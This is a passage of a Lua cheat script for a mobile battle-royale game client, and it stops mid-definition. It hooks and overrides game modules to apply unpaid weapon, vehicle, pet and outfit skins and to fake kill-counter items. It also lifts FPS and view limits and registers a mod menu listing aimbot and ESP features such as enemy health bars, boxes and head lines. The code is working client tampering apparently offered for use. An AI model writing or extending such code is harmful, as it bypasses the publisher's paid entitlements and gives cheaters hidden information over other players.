_G.ApplyWeaponSkins = function(PlayerCharacter)
    pcall(function()
        local WeaponManager = PlayerCharacter:GetWeaponManager()
        if not slua.isValid(WeaponManager) then return end
        
        for slot = 1, 3 do
            local Weapon = WeaponManager:GetInventoryWeaponByPropSlot(slot)
            if slua.isValid(Weapon) and slua.isValid(Weapon.synData) then
                local WeaponID = Weapon:GetWeaponID()
                local SkinID = _G.get_skin_id(WeaponID) or WeaponID
                local isModified = false
                
                local SkinData = Weapon.synData:Get(7) 
                if SkinData and SkinData.defineID and SkinData.defineID.TypeSpecificID ~= SkinID then
                    SkinData.defineID.TypeSpecificID = SkinID
                    Weapon.synData:Set(7, SkinData)
                    if Weapon.SetWeaponAvatarID then pcall(function() Weapon:SetWeaponAvatarID(SkinID) end) end
                    if not _G.skinIdCache[SkinID] then 
                        _G.download_item(SkinID)
                        _G.skinIdCache[SkinID] = true 
                    end
                    isModified = true
                end
                
                if SkinID >= 10000000 and _G.VIP_Attachments and _G.VIP_Attachments[SkinID] then
                    for AttachIdx = 0, 5 do 
                        local attachData = Weapon.synData:Get(AttachIdx)
                        if attachData then
                            local defineIDRef = slua.IndexReference(attachData, "defineID")
                            if defineIDRef then
                                local attachmentId = defineIDRef.TypeSpecificID
                                if attachmentId and attachmentId > 0 then
                                    local mapIndex = _G.BaseAttachToIndex[attachmentId] or _G.VipAttachToIndex[attachmentId]
                                    if mapIndex and _G.VIP_Attachments[SkinID][mapIndex] and _G.VIP_Attachments[SkinID][mapIndex] > 0 then
                                        local targetAttachId = _G.VIP_Attachments[SkinID][mapIndex]
                                        if targetAttachId ~= attachmentId then
                                            attachData.defineID.TypeSpecificID = targetAttachId
                                            Weapon.synData:Set(AttachIdx, attachData)
                                            if not _G.skinIdCache2[targetAttachId] then 
                                                if _G.download_item then pcall(_G.download_item, targetAttachId) end
                                                _G.skinIdCache2[targetAttachId] = true 
                                            end
                                            isModified = true
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                
                if isModified then
                    if Weapon.DelayHandleAvatarMeshChanged then pcall(function() Weapon:DelayHandleAvatarMeshChanged() end) end
                    if Weapon.OnRep_synData then pcall(function() Weapon:OnRep_synData() end) end
                end
            end
        end
    end)
end

_G.ApplyVehicleSkins = function(PlayerCharacter)
    pcall(function()
        local Vehicle = PlayerCharacter:GetCurrentVehicle()
        if not slua.isValid(Vehicle) then 
            _G.LastVehicleEntity = nil
            return 
        end
        
        if _G.LastVehicleEntity == Vehicle and _G.CurrentEquipVehicleID ~= nil then
            return
        end

        local VehicleAvatar = Vehicle.VehicleAvatar or Vehicle.VehicleAvatarComponent_BP or Vehicle:GetAvatarComponent()
        if not slua.isValid(VehicleAvatar) then return end

        local defId = tostring(VehicleAvatar:GetDefaultAvatarID() or Vehicle.VehicleID or "")
        local currentId = tostring(Vehicle:GetAvatarId() or "")
        local applySkinId = 0
        
        for baseMapId, targetSkin in pairs(_G.VehicleSkinMap) do
            if defId:find(tostring(baseMapId)) or currentId:find(tostring(baseMapId)) then 
                applySkinId = targetSkin
                break 
            end
        end

        if applySkinId and applySkinId > 0 then
            _G.skinIdCache = _G.skinIdCache or {}
            if not _G.skinIdCache[applySkinId] then 
                if _G.download_item then pcall(_G.download_item, applySkinId) end
                _G.skinIdCache[applySkinId] = true 
            end

            VehicleAvatar.curSwitchEffectId = 7303001
            if VehicleAvatar.ChangeItemAvatar then VehicleAvatar:ChangeItemAvatar(applySkinId, true) end
            
            _G.CurrentEquipVehicleID = applySkinId
            _G.LastVehicleEntity = Vehicle
        end
    end)
end

_G.HandlePetLogic = function()
    pcall(function()
        local petSkin = _G.OutfitMap.Pet
        if not petSkin or petSkin == 0 or petSkin == 50000 or petSkin == _G.LastAppliedPet then return end
        
        _G.skinIdCache = _G.skinIdCache or {}
        if not _G.skinIdCache[petSkin] then 
            if _G.download_item then pcall(_G.download_item, petSkin) end
            _G.skinIdCache[petSkin] = true 
        end
        
        local ModuleManager = require("client.module_framework.ModuleManager")
        if ModuleManager then
            local logic_pet = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.logic_pet)
            if logic_pet then
                if logic_pet.SetCurPetID then logic_pet:SetCurPetID(petSkin) end
                if logic_pet.EquipPet then logic_pet:EquipPet(petSkin) end
            end
        end
        _G.LastAppliedPet = petSkin
    end)
end

_G.ForceRefreshSkinMaps = function()
    pcall(function()
        if not _G.YourSeller or not _G.YourSeller.CustomTextData then return end
        local cData = _G.YourSeller.CustomTextData

        if _G.OutfitSkins then
            if cData.SkinSuit and _G.OutfitSkins.Suit[cData.SkinSuit] then _G.OutfitMap.Suit = _G.OutfitSkins.Suit[cData.SkinSuit] end
            if cData.SkinBag and _G.OutfitSkins.Bag[cData.SkinBag] then _G.OutfitMap.Bag = _G.OutfitSkins.Bag[cData.SkinBag] end
            if cData.SkinHelmet and _G.OutfitSkins.Helmet[cData.SkinHelmet] then _G.OutfitMap.Helmet = _G.OutfitSkins.Helmet[cData.SkinHelmet] end
        end

       
            if _G.skinIdMappings then
            if cData.SkinM416 and _G.skinIdMappings[101004] and _G.skinIdMappings[101004][cData.SkinM416] then
            _G.WeaponSkinMap[101004] = _G.skinIdMappings[101004][cData.SkinM416] end
            if cData.SkinAKM and _G.skinIdMappings[101001] and _G.skinIdMappings[101001][cData.SkinAKM] then
            _G.WeaponSkinMap[101001] = _G.skinIdMappings[101001][cData.SkinAKM] end
            if cData.SkinSCAR and _G.skinIdMappings[101003] and _G.skinIdMappings[101003][cData.SkinSCAR] then
            _G.WeaponSkinMap[101003] = _G.skinIdMappings[101003][cData.SkinSCAR] end
            if cData.SkinM762 and _G.skinIdMappings[101008] and _G.skinIdMappings[101008][cData.SkinM762] then
            _G.WeaponSkinMap[101008] = _G.skinIdMappings[101008][cData.SkinM762] end
            if cData.SkinAUG and _G.skinIdMappings[101006] and _G.skinIdMappings[101006][cData.SkinAUG] then
            _G.WeaponSkinMap[101006] = _G.skinIdMappings[101006][cData.SkinAUG] end
            if cData.SkinUMP and _G.skinIdMappings[102002] and _G.skinIdMappings[102002][cData.SkinUMP] then
            _G.WeaponSkinMap[102002] = _G.skinIdMappings[102002][cData.SkinUMP] end
            
            if cData.SkinUZI and _G.skinIdMappings[102001] and _G.skinIdMappings[102001][cData.SkinUZI] then
            _G.WeaponSkinMap[102001] = _G.skinIdMappings[102001][cData.SkinUZI] end
            if cData.SkinGroza and _G.skinIdMappings[101005] and _G.skinIdMappings[101005][cData.SkinGroza] then
            _G.WeaponSkinMap[101005] = _G.skinIdMappings[101005][cData.SkinGroza] end
            if cData.SkinS12K and _G.skinIdMappings[104003] and _G.skinIdMappings[104003][cData.SkinS12K] then
            _G.WeaponSkinMap[104003] = _G.skinIdMappings[104003][cData.SkinS12K] end
            if cData.SkinDBS and _G.skinIdMappings[104004] and _G.skinIdMappings[104004][cData.SkinDBS] then
            _G.WeaponSkinMap[104004] = _G.skinIdMappings[104004][cData.SkinDBS] end
        end

        if _G.VehicleSkins then
            if cData.SkinDacia and _G.VehicleSkins[1903001] and _G.VehicleSkins[1903001][cData.SkinDacia] then
            _G.VehicleSkinMap[1903001] = _G.VehicleSkins[1903001][cData.SkinDacia] end
            if cData.SkinUAZ and _G.VehicleSkins[1908001] and _G.VehicleSkins[1908001][cData.SkinUAZ] then
            _G.VehicleSkinMap[1908001] = _G.VehicleSkins[1908001][cData.SkinUAZ] end
            if cData.SkinCoupe and _G.VehicleSkins[1961001] and _G.VehicleSkins[1961001][cData.SkinCoupe] then
            _G.VehicleSkinMap[1961001] = _G.VehicleSkins[1961001][cData.SkinCoupe] end
            if cData.SkinBuggy and _G.VehicleSkins[1907001] and _G.VehicleSkins[1907001][cData.SkinBuggy] then
            _G.VehicleSkinMap[1907001] = _G.VehicleSkins[1907001][cData.SkinBuggy] end
            if cData.SkinMirado and _G.VehicleSkins[1915001] and _G.VehicleSkins[1915001][cData.SkinMirado] then
            _G.VehicleSkinMap[1915001] = _G.VehicleSkins[1915001][cData.SkinMirado] end
        end
    end)
end

local cached_GameplayStatics = nil
local cached_PlayerTombBox = nil
local cached_ActorClass = nil
_G.NeedCheckDeadBoxTimer = 0

_G.DeadBox_TemperRequest = function(PlayerController)
    if _G.NeedCheckDeadBoxTimer <= 0 then return end
    
    -- [FIX LAG]: Giới hạn quét hòm xác 2 giây/lần bằng đồng hồ thực của máy (rất nhẹ CPU)
    local curTime = os.clock()
    if _G.LastCheckDeadBoxTime and (curTime - _G.LastCheckDeadBoxTime) < 2.0 then return end
    _G.LastCheckDeadBoxTime = curTime
    
    _G.NeedCheckDeadBoxTimer = _G.NeedCheckDeadBoxTimer - 1

    local PlayerCharacter = PlayerController:GetPlayerCharacterSafety()
    if not slua.isValid(PlayerCharacter) then return end
    
    if not cached_GameplayStatics then
        cached_GameplayStatics = import("GameplayStatics")
        cached_ActorClass = import("Actor")
        cached_PlayerTombBox = import("PlayerTombBox")
    end
    
    -- [FIX MEMORY LEAK]: Sinh mảng cache 1 lần duy nhất thay vì tạo lại liên tục
    if not _G.CachedActorArray then
        _G.CachedActorArray = slua.Array(UEnums.EPropertyClass.Object, cached_ActorClass)
    end
    
    local UI_Util = require("client.common.ui_util")
    local GameInstance = UI_Util and UI_Util.GetGameInstance()
    if not GameInstance or not cached_GameplayStatics then return end

    local deadBoxes = cached_GameplayStatics.GetAllActorsOfClass(GameInstance, cached_PlayerTombBox, _G.CachedActorArray)
    
    for _, deadBoxActor in pairs(deadBoxes) do
        if slua.isValid(deadBoxActor) and not deadBoxActor.bIsTDSkinApplied then
            local damageCauser = deadBoxActor.DamageCauser
            if damageCauser and damageCauser.PlayerKey == PlayerController.PlayerKey then
                local DeadBoxAvatarComponent = deadBoxActor.DeadBoxAvatarComponent_BP
                if slua.isValid(DeadBoxAvatarComponent) then
                    local currentBoxSkinId = 0
                    if PlayerCharacter.CurrentVehicle and _G.CurrentEquipVehicleID and _G.CurrentEquipVehicleID ~= 0 then
                        currentBoxSkinId = tonumber(tostring(_G.CurrentEquipVehicleID) .. "1") or 0
                    else
                        local currentWeapon = PlayerCharacter:GetCurrentWeapon()
                        if slua.isValid(currentWeapon) and currentWeapon.synData then
                            local weaponSkinData = currentWeapon.synData:Get(7)
                            if weaponSkinData and weaponSkinData.defineID then
                                currentBoxSkinId = weaponSkinData.defineID.TypeSpecificID
                            end
                        end
                    end
                    
                    if currentBoxSkinId ~= 0 then
                        pcall(function()
                            DeadBoxAvatarComponent:ResetItemAvatar()
                            DeadBoxAvatarComponent:PreChangeItemAvatar(currentBoxSkinId)
                            DeadBoxAvatarComponent:SyncChangeItemAvatar(currentBoxSkinId)
                        end)
                    end
                    deadBoxActor.bIsTDSkinApplied = true
                end
            end
        end
    end
end

_G.TDFTDeKillCounts = _G.TDFTDeKillCounts or {}
local CACHED_LinearColor = import("LinearColor")
local CACHED_GoldColor = CACHED_LinearColor and CACHED_LinearColor(1.0, 0.8, 0.0, 1.0) or nil
local CACHED_UI_Manager = nil

_G.ForceEnableKillCounterUI = function()
    pcall(function()
        local KillCounterUISubsystem = package.loaded["GameLua.Mod.BaseMod.Client.KillCounter.KillCounterUISubsystem"] or require("GameLua.Mod.BaseMod.Client.KillCounter.KillCounterUISubsystem")
        if KillCounterUISubsystem and KillCounterUISubsystem.__inner_impl and not _G.KCUISystemHacked2 then
            local kcImpl = KillCounterUISubsystem.__inner_impl
            kcImpl.CheckSupportKCUI = function() return true end
            kcImpl.CheckNeedMainKillCounterUI = function(self, PlayerWeapon, PlayerID)
                if slua.isValid(PlayerWeapon) then
                    local WeaponID = PlayerWeapon:GetWeaponID()
                    self:UpdateMainKillCounterUI(true, WeaponID, _G.get_skin_id(WeaponID) or WeaponID)
                else self:UpdateMainKillCounterUI(false) end
            end
            local originalUpdateMainKillCounterUI = kcImpl.UpdateMainKillCounterUI
            kcImpl.UpdateMainKillCounterUI = function(self, bShow, WeaponID, AvatarID)
                if bShow then AvatarID = _G.get_skin_id(WeaponID) or AvatarID end
                if originalUpdateMainKillCounterUI then originalUpdateMainKillCounterUI(self, bShow, WeaponID, AvatarID) end
            end
            _G.KCUISystemHacked2 = true
        end

        local ModuleManager = require("client.module_framework.ModuleManager")
        if ModuleManager and not _G.KCLogicHacked2 then
            local LogicKillCounter = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.LogicKillCounter)
            if LogicKillCounter then
                LogicKillCounter.CheckSupportKC = function() return true end
                LogicKillCounter.CheckSupportKillCounterAvatar = function() return true end
                LogicKillCounter.CheckHasWeaponKillCounter = function() return true end
                LogicKillCounter.GetBaseKillCounterIdByWeaponId = function() return 2100004 end
                LogicKillCounter.GetEquipedKillCounterId = function() return 2100004 end
                LogicKillCounter.GetMyEquipedKillCounterId = function() return 2100004 end
                LogicKillCounter.GetOneWeaponKillCountInBattle = function(self, uid, weaponId) return _G.TDFTDeKillCounts[weaponId] or 0 end
                LogicKillCounter.GetWeaponKillCountByUid = function(self, uid, weaponId) return _G.TDFTDeKillCounts[weaponId] or 0 end
                _G.KCLogicHacked2 = true
            end
        end

        local killInfoPath = "GameLua.Mod.BaseMod.Client.KillInfoTips.KillInfo"
        local KillInfo = package.loaded[killInfoPath] or require(killInfoPath)
        
        if KillInfo and KillInfo.__inner_impl and not _G.KillInfoCounterHacked then
            local originalFileItem = KillInfo.__inner_impl.FileItem
            KillInfo.__inner_impl.FileItem = function(self, DamageRecordData)
                pcall(function()
                    local LocalPlayer = require("GameLua.GameCore.Data.GameplayData").GetPlayerCharacter()
                    if slua.isValid(LocalPlayer) and DamageRecordData.Causer == LocalPlayer:GetPlayerNameSafety() then 
                        local currentWeapon = LocalPlayer:GetCurrentWeapon()
                        if slua.isValid(currentWeapon) then
                            local weaponID = currentWeapon:GetWeaponID()
                            local skinID = _G.get_skin_id(weaponID)
                            if skinID then DamageRecordData.CauserWeaponAvatarID = skinID end
                            if _G.OutfitMap.Suit and _G.OutfitMap.Suit ~= 0 then DamageRecordData.CauserClothAvatarID = _G.OutfitMap.Suit end
                            
                            if CACHED_GoldColor then
                                DamageRecordData.IsUseColor, DamageRecordData.UseColor = true, CACHED_GoldColor
                            end
                            
                            if DamageRecordData.ResultHealthStatus == 2 then
                                _G.TDFTDeKillCounts[weaponID] = (_G.TDFTDeKillCounts[weaponID] or 0) + 1
                                _G.NeedCheckDeadBoxTimer = 50 
                                
                                if not CACHED_UI_Manager then CACHED_UI_Manager = require("client.slua_ui_framework.manager") end
                                local uiMainKillCounter = CACHED_UI_Manager.GetUI(CACHED_UI_Manager.UI_Config_InGame.MainKillCounter)
                                
                                if uiMainKillCounter and uiMainKillCounter.UpdateWeaponID then
                                    local mainAvatarID = skinID or currentWeapon:GetWeaponMainAvatarID()
                                    uiMainKillCounter:UpdateWeaponID(weaponID, mainAvatarID)
                                    local kcModule = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.LogicKillCounter)
                                    local kcItemID = kcModule:GetEquipedKillCounterId(0, mainAvatarID)
                                    uiMainKillCounter:SetKillCounterItemShowWithNum(kcItemID, _G.TDFTDeKillCounts[weaponID], mainAvatarID)
                                end
                            end
                        end
                    end
                end)
                if originalFileItem then return originalFileItem(self, DamageRecordData) end
            end
            _G.KillInfoCounterHacked = true
        end

        local SwitchWeaponSlotMode2 = package.loaded["GameLua.Mod.BaseMod.Client.MainControlUI.SwitchWeaponSlotMode2"] or require("GameLua.Mod.BaseMod.Client.MainControlUI.SwitchWeaponSlotMode2")
        if SwitchWeaponSlotMode2 and SwitchWeaponSlotMode2.__inner_impl and not _G.SlotBaseHacked then
            SwitchWeaponSlotMode2.__inner_impl.CheckShowKCIcon = function(self)
                if slua.isValid(self.KillCounterImg) then 
                    self.KillCounterImg:SetVisibility(import("ESlateVisibility").SelfHitTestInvisible) 
                end
            end
            _G.SlotBaseHacked = true
        end
    end)
end

function _G.InitializeSkinModSystem()
    pcall(function()
        local LobbyAvatar = package.loaded["client.logic.avatar.LobbyAvatar"] or require("client.logic.avatar.LobbyAvatar")
        if LobbyAvatar and not _G.LobbyHacked then
            local originalPutonEquipment = LobbyAvatar.PutonEquipment
            LobbyAvatar.PutonEquipment = function(self, itemID, tAvatarCustom, tExtraData)
                local attachIndex = _G.BaseAttachToIndex and _G.BaseAttachToIndex[itemID]
                if attachIndex then
                    local holdingWeaponSkinID = self.GetCurHoldingWeaponSkinID and self:GetCurHoldingWeaponSkinID()
                    if holdingWeaponSkinID and holdingWeaponSkinID >= 10000000 and _G.VIP_Attachments and _G.VIP_Attachments[holdingWeaponSkinID] then
                        local vipAttachID = _G.VIP_Attachments[holdingWeaponSkinID][attachIndex]
                        if vipAttachID and vipAttachID > 0 then
                            if self.HandleDownload then self:HandleDownload(vipAttachID, nil, nil, false) end
                            itemID = vipAttachID
                        end
                    end
                end
                if originalPutonEquipment then return originalPutonEquipment(self, itemID, tAvatarCustom, tExtraData) end
            end

            local originalCharEquipWeaponByResId = LobbyAvatar.CharEquipWeaponByResId
            LobbyAvatar.CharEquipWeaponByResId = function(self, resID, isUse, isAsync, SocketName)
                local retValue = originalCharEquipWeaponByResId and originalCharEquipWeaponByResId(self, resID, isUse, isAsync, SocketName) or nil
                if isUse and self.GetEquipments then
                    local equipments = self:GetEquipments()
                    for _, equip in ipairs(equipments) do
                        if _G.BaseAttachToIndex and _G.BaseAttachToIndex[equip.itemID] then
                            self:PutonEquipment(equip.itemID, equip.CustomInfo, {bIsUse = false})
                        end
                    end
                end
                return retValue
            end
            _G.LobbyHacked = true
        end
    end)
    
    pcall(function()
        local Common_Items_UIBP = package.loaded["client.slua.component.item.ItemChildren.Common_Items_UIBP"] or require("client.slua.component.item.ItemChildren.Common_Items_UIBP")
        if Common_Items_UIBP and not _G.IconBaloHacked then
        local originalInitView = Common_Items_UIBP.InitView
            Common_Items_UIBP.InitView = function(self, nItemId, nCount, nValidTime, tExtraData)
                tExtraData = tExtraData or {}
                local displayResId = nil
                
                if _G.get_skin_id then
                    local skinID = _G.get_skin_id(nItemId)
                    if skinID and skinID ~= nItemId then displayResId = skinID end
                end
                
                local attachIndex = _G.BaseAttachToIndex and _G.BaseAttachToIndex[nItemId]
                if not displayResId and attachIndex then
                    local GameplayData = require("GameLua.GameCore.Data.GameplayData")
                    local LocalPlayer = GameplayData and GameplayData.GetPlayerCharacter()
                    if slua.isValid(LocalPlayer) then
                        local currentWeapon = LocalPlayer:GetCurrentWeapon()
                        if slua.isValid(currentWeapon) then
                            local weaponID = currentWeapon:GetWeaponID()
                            local finalSkinID = _G.get_skin_id(weaponID) or weaponID
                            if finalSkinID >= 10000000 and _G.VIP_Attachments and _G.VIP_Attachments[finalSkinID] then
                                local vipAttachID = _G.VIP_Attachments[finalSkinID][attachIndex]
                                if vipAttachID and vipAttachID > 0 then displayResId = vipAttachID end
                            end
                        end
                    end
                end
                
                if displayResId then
                    tExtraData.displayResId = displayResId
                    if not _G.skinIdCache2[displayResId] then
                        if _G.download_item then pcall(_G.download_item, displayResId) end
                        _G.skinIdCache2[displayResId] = true
                    end
                end
                if originalInitView then return originalInitView(self, nItemId, nCount, nValidTime, tExtraData) end
            end
            _G.IconBaloHacked = true
        end
    end)
end

local _slua = rawget(_G, "slua")
local function Valid(obj) if not obj then return false end if _slua and
_slua.isValid then local ok, v = pcall(_slua.isValid, obj) if not ok or not v
then return false end end return true end

local function InitializeGraphicsUnlock()
    pcall(function()
        local SettingCfg = require("client.logic.setting.setting_config")
        local GraphicSettingDB = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
        if SettingCfg then
            if SettingCfg.TpViewValue then SettingCfg.TpViewValue.max = 160 end
            if SettingCfg.FpViewValue then SettingCfg.FpViewValue.max = 160 end
        end
        if GraphicSettingDB then
            if GraphicSettingDB.TpViewValue then GraphicSettingDB.TpViewValue.max = 160 end
        end
    end)

    pcall(function()
        local logic_setting_graphics = require("client.slua.logic.setting.logic_setting_graphics")
        local GSC_FPS = require("client.slua.umg.NewSetting.GraphicsNew.Comps.GSC_FPS")
        local GSC_FPSFT = require("client.slua.umg.NewSetting.GraphicsNew.Comps.GSC_FPSFT")
        local GraphicSettingDB = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
        
        local KismetMathLibrary = import("KismetMathLibrary") or _G.KismetMathLibrary
        local FLinearColor = import("LinearColor") or _G.FLinearColor

        if logic_setting_graphics then
            local old_SetFPS = logic_setting_graphics.SetFPS
            function logic_setting_graphics.SetFPS(gameInstance, FPSLevel)
                if old_SetFPS then old_SetFPS(gameInstance, FPSLevel) end
                if FPSLevel == 8 then 
                    gameInstance:ExecuteCMD("t.MaxFPS", "165")
                    gameInstance:ExecuteCMD("r.FrameRateLimit", "165")
                end
            end
        end

        if GSC_FPS and GSC_FPS.__inner_impl then
            local fps_impl = GSC_FPS.__inner_impl
            function fps_impl:GetMaxFPSLevel() return 8, 8 end
            function fps_impl:InitRealSupportFPS()
                local RealSupportFPS = {}
                for i = 1, 8 do RealSupportFPS[i] = {true, true} end
                if GraphicSettingDB then GraphicSettingDB:UpdateUIData(GraphicSettingDB.RealSupportFPS, RealSupportFPS, false) end
                return RealSupportFPS
            end
            function fps_impl:UpdateSelectedFPSState(selectedLevel)
                if not slua.isValid(self.UIRoot) then return end
                for level = 2, 8 do
                    local name = "NodeFps" .. (({[2]=20,[3]=25,[4]=30,[5]=40,[6]=60,[7]=90,[8]=120})[level] or 120)
                    local widget = self.UIRoot[name]
                    if slua.isValid(widget) then
                        widget:SetIsEnabled(true) 
                        pcall(function() widget:SetRenderOpacity(1.0) end)
                        local switcher = self.UIRoot["WidgetSwitcher_" .. level]
                        if slua.isValid(switcher) then 
                            switcher:SetActiveWidgetIndex(level == selectedLevel and 0 or 1) 
                        end
                    end
                end
            end
        end

        if GSC_FPSFT and GSC_FPSFT.__inner_impl then
            local ft_impl = GSC_FPSFT.__inner_impl
            local NMinFPS, NStep = 90, 5
            local function clamp(value, min, max)
                if value < min then return min end
                if max < value then return max end
                return value
            end
            local function lerp(a, b, t) return a + (b - a) * t end
            local function _getColorByPercent(start, finish, percent)
                if not FLinearColor then return nil end
                return FLinearColor(lerp(start.R, finish.R, percent), lerp(start.G, finish.G, percent), lerp(start.B, finish.B, percent), lerp(start.A, finish.A, percent))
            end
            
            ft_impl.ShowOrHide = function(self)
                self:SelfHitTestInvisible()
                if self.InitFPSFTSwitch then self:InitFPSFTSwitch() end
            end

            ft_impl.InitFPSFTSwitch = function(self)
                local FPSFineTuneSwitch = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch)
                if self.UIRoot.Setting_Switch then self.UIRoot.Setting_Switch:SetSwitcherEnable2(FPSFineTuneSwitch, true) end
                if self.UIRoot.CanvasPanel_8 then self:SetWidgetVisible(self.UIRoot.CanvasPanel_8, FPSFineTuneSwitch) end
                if self.UIRoot.WidgetSwitcher_0 then self.UIRoot.WidgetSwitcher_0:SetActiveWidgetIndex(2) end
                if self.InitFPSFTValue165 then self:InitFPSFTValue165() end
            end

            ft_impl.InitFPSFTValue165 = function(self)
                local itemRoot = self.UIRoot
                local FPSFineTuneSwitch = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch)
                local FPSFineTuneNum = 165
                if FPSFineTuneSwitch then
                    FPSFineTuneNum = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneNum) or 165
                    itemRoot.Slider_screen3:SetLocked(false)
                    if FLinearColor then
                        itemRoot.ProgressBar_screen3:SetFillColorAndOpacity(FLinearColor(1.0, 1.0, 1.0, 1.0))
                        itemRoot.Slider_screen3:SetSliderHandleColor(FLinearColor(1.0, 1.0, 1.0, 1.0))
                    end
                else
                    itemRoot.Slider_screen3:SetLocked(true)
                    if FLinearColor then
                        itemRoot.ProgressBar_screen3:SetFillColorAndOpacity(FLinearColor(1.0, 0.625, 0.6, 1))
                        itemRoot.Slider_screen3:SetSliderHandleColor(FLinearColor(1.0, 0.625, 0.6, 1.0))
                    end
                end
                local FPSFineTunePer = (FPSFineTuneNum - NMinFPS) / (165 - NMinFPS)
                
                itemRoot.Veihclescreen3:SetText(tostring(FPSFineTuneNum))
                itemRoot.Slider_screen3:SetValue(FPSFineTunePer)
                itemRoot.ProgressBar_screen3:SetPercent(FPSFineTunePer)
                
                if FLinearColor then
                    local startColor = FLinearColor(1.0, 1.0, 1.0, 1.0)
                    local midColor = FLinearColor(1.0, 0.54, 0.11, 1.0)
                    local endColor = FLinearColor(1.0, 0.23, 0.15, 1.0)
                    local sliderColor = FPSFineTunePer < 0.4 and startColor or _getColorByPercent(midColor, endColor, (FPSFineTunePer - 0.4) / 0.6)
                    itemRoot.Slider_screen3:SetSliderHandleColor(sliderColor)
                end
            end

            ft_impl.OnFPSFTValueChange3 = function(self, FPSFineTuneNum)
                GraphicSettingDB:UpdateUIData(GraphicSettingDB.FPSFineTuneNum, FPSFineTuneNum)
                if self.InitFPSFTValue165 then self:InitFPSFTValue165() end
                if self:GetParentUI() then self:GetParentUI():SetDirty(true) end
                local gameInstance = GraphicSettingDB.GetGameInstance and GraphicSettingDB.GetGameInstance()
                if gameInstance then
                    gameInstance:ExecuteCMD("t.MaxFPS", tostring(FPSFineTuneNum))
                    gameInstance:ExecuteCMD("r.FrameRateLimit", tostring(FPSFineTuneNum))
                end
            end

            ft_impl.OnFPSFTSliderValueChange3 = function(self, value)
                if GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch) and KismetMathLibrary then
                    local FPSFineTuneNum = KismetMathLibrary.FCeil(value * (165 - NMinFPS) / NStep) * NStep + NMinFPS
                    self:OnFPSFTValueChange3(clamp(FPSFineTuneNum, NMinFPS, 165))
                end
            end
            
            ft_impl.OnFPSFTAdd = ft_impl.OnFPSFTAdd3
            ft_impl.OnFPSFTMinus = ft_impl.OnFPSFTMinus3
            ft_impl.OnFPSFTAdd2 = ft_impl.OnFPSFTAdd3
            ft_impl.OnFPSFTMinus2 = ft_impl.OnFPSFTMinus3
            ft_impl.OnFPSFTSliderValueChange = ft_impl.OnFPSFTSliderValueChange3
            ft_impl.OnFPSFTSliderValueChange2 = ft_impl.OnFPSFTSliderValueChange3
        end
    end)
end

-- ========================================== 
-- Settings Menu For Turn On/Off All Features 
-- ========================================== 
function _G.InitModMenuTab()
    if _G.ModMenuInitialized then return end
    _G.ModMenuInitialized = true
    
    local SettingPageDefine = require("client.logic.NewSetting.SettingPageDefine")
    local SettingCatalog = require("client.logic.NewSetting.SettingCatalog")
    local AliasMap = require("client.slua.umg.NewSetting.Item.AliasMap")
    
    local LocUtil = _G.LocUtil
    if not LocUtil and package.loaded["client.common.LocUtil"] then
        LocUtil = require("client.common.LocUtil")
    end
    
    local FakeTextMap = {
        [999000] = "MOD MENU",
        [999002] = "AIMBOT",
        [999003] = "ESP MENU",
        [999004] = "SDK MENU",
        [999005] = "SKINS MENU"
    }

    if LocUtil and not LocUtil._IsModMenuHooked_V2 then
        local hookFuncs = {"GetLocalizeResStr", "GetText", "GetTextByID", "GetLocalText", "GetLocalizeStr"}
        for _, funcName in ipairs(hookFuncs) do
            if LocUtil[funcName] then
                local old_func = LocUtil[funcName]
                LocUtil[funcName] = function(id)
                    if FakeTextMap[id] then
                        return FakeTextMap[id]
                    end
                    if type(id) == "string" and not tonumber(id) then
                        return id
                    end
                    if old_func then
                        return old_func(id)
                    end
                    return ""
                end
            end
        end
        LocUtil._IsModMenuHooked_V2 = true
    end
    if not SettingPageDefine.YourSellerMenu then
    
    local StackESP = {
    
{
Key = "ModMenu_ESP_NativeHP", UI = AliasMap.Switcher,
Text = "ESP HP + Name",
GetFunc = function() return (_G.YourSeller_Config.EspNameHP or 0) == 1 end,
SetFunc = function(c, v)
    _G.__ModMenuTouched = true
    _G.YourSeller_Config.EspNameHP = v and 1 or 0
    if _G.AK_Features then
        for _, f in ipairs(_G.AK_Features) do
            if f.id == "EspNameHP" then f.val = _G.YourSeller_Config.EspNameHP end
        end
    end
    -- ✅ Off karne pe saare native markers turant hatao
    if not v then
        pcall(function()
            if GameplayData and GameplayData.GetAllPlayerCharacters then
                for _, enemy in pairs(GameplayData.GetAllPlayerCharacters() or {}) do
                    if enemy and enemy.bHasAKNativeHPBar and enemy.NativeHPBarMark then
                        local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
                        if InGameMarkTools and InGameMarkTools.ClientRemoveMapMark then
                            InGameMarkTools.ClientRemoveMapMark(enemy.NativeHPBarMark)
                        end
                        enemy.NativeHPBarMark = nil
                        enemy.bHasAKNativeHPBar = false
                    end
                end
            end
        end)
        if _G.NativeHPNameRenderer then
            pcall(_G.NativeHPNameRenderer.ClearAll)
        end
    end
    return true
end
},
    
    {
    Key = "ModMenu_ESP_HP", UI = AliasMap.Switcher,
    Text = "ESP Health Bar",
    GetFunc = function() return (_G.YourSeller_Config.ESP_HP or 0) == 1 end,
    SetFunc = function(c, v)
        _G.__ModMenuTouched = true
        _G.YourSeller_Config.ESP_HP = v and 1 or 0
        if _G.AK_Features then
            for _, f in ipairs(_G.AK_Features) do
                if f.id == "ESP_HP" then f.val = _G.YourSeller_Config.ESP_HP end
            end
        end
        return true
    end
    },
    {
    Key = "ModMenu_ESP_BOX", UI = AliasMap.Switcher,
    Text = "ESP Box",
    GetFunc = function() return (_G.YourSeller_Config.ESP_BOX or 0) == 1 end,
    SetFunc = function(c, v)
        _G.__ModMenuTouched = true
        _G.YourSeller_Config.ESP_BOX = v and 1 or 0
        if _G.AK_Features then
            for _, f in ipairs(_G.AK_Features) do
                if f.id == "ESP_BOX" then f.val = _G.YourSeller_Config.ESP_BOX end
            end
        end
        return true
    end
    },
    {
    Key = "ModMenu_ESP_LINE", UI = AliasMap.Switcher,
    Text = "ESP Head Line",
